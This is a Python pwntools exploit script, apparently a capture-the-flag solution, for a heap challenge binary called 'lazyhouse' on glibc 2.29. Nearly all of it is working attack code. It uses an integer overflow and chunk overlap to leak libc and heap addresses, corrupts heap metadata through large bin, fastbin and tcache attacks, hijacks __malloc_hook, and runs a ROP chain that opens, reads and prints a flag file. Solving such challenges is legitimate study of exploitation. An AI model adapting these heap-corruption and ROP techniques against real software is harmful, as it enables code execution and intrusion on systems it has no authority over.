#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './lazyhouse'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
libc = ELF('./libc-2.29.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/gx $rebase(0x5010)
        x/24gx $rebase(0x5060)
        end

    b calloc
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(index, size, content):
    sh.sendlineafter('Your choice: ', '1')
    sh.sendlineafter('Index:', str(index))
    sh.sendlineafter('Size:', str(size))
    if(content):
        sh.sendafter('House:', content)

def show(index):
    sh.sendlineafter('Your choice: ', '2')
    sh.sendlineafter('Index:', str(index))

def delete(index):
    sh.sendlineafter('Your choice: ', '3')
    sh.sendlineafter('Index:', str(index))

def edit(index, content):
    sh.sendlineafter('Your choice: ', '4')
    sh.sendlineafter('Index:', str(index))
    sh.sendafter('House:', content)

def triger(content):
    sh.sendlineafter('Your choice: ', '5')
    sh.sendafter('House:', content)

# Multiplication overflow
add(0, 0x12c9fb4d812c9fc, None)
delete(0)

# chunk overlap
add(0, 0x88, '\n')
add(1, 0x248, '\n')
add(2, 0x248, '\n')
add(6, 0x248, '\n')
add(3, 0x88, '\n')
add(7, 0x88, '\n')
add(4, 0x448, '\n')

for i in range(7):
    add(5, 0x248, '\n')
    delete(5)

edit(0, 'a' * 0x80 + p64(0) + p64(0x781))
delete(1)
add(1, 0x338, 'b' * 0x240 + p64(0) + p64(0x251))
add(5, 0x600, '\n')
show(2)
sh.recvn(0xf0)
libc_addr = u64(sh.recvn(8)) - 1120 - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))

sh.recvn(8)

heap_addr = u64(sh.recvn(8)) & 0xfffffffffffff000
log.success('heap_addr: ' + hex(heap_addr))

# large bin attack
delete(2)
add(2, 0x248, 'c' * 0xe0 + p64(0) + p64(0x441) + p64(libc_addr + 0x1e50a0) + p64(libc_addr + 0x1e50a0) + p64(0) + p64(libc_addr + 0x1e7600 - 0x20))
delete(4)
add(4, 0x88, '\n')

# fastbin attack
delete(4)
delete(2)
edit(1, 'd' * 0x240 + p64(0) + p64(0x251) + p64(heap_addr))

# for ROP
layout = [
    0,
    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    heap_addr + 0x540 + 0x100,
    libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
    0,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    2,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 

    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    3,
    libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
    heap_addr,
    libc_addr + 0x000000000012bda6, #: pop rdx; ret; 
    0x100,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    0,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 

    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    1,
    libc_addr + 0x0000000000026f9e, #: pop rsi; ret; 
    heap_addr,
    libc_addr + 0x000000000012bda6, #: pop rdx; ret; 
    0x100,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    1,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 

    libc_addr + 0x0000000000026542, #: pop rdi; ret; 
    0,
    libc_addr + 0x0000000000047cf8, #: pop rax; ret; 
    231,
    libc_addr + 0x00000000000cf6c5, #: syscall; ret; 
]
add(2, 0x248, flat(layout).ljust(0x100, '\0') + './flag')

# hijack tcache
add(4, 0x248, '\0' * 0x40 + p64(0) * 0x20 + p64(libc_addr + libc.symbols['__malloc_hook']))

triger(p64(libc_addr + 0x0058373))
delete(4)

# triger ROP
sh.sendafter('Your choice: ', '1\0'.ljust(0x20, '0'))
sh.sendlineafter('Index:', str(4))
sh.sendlineafter('Size:', str(heap_addr + 0x540))

sh.interactive()
clear()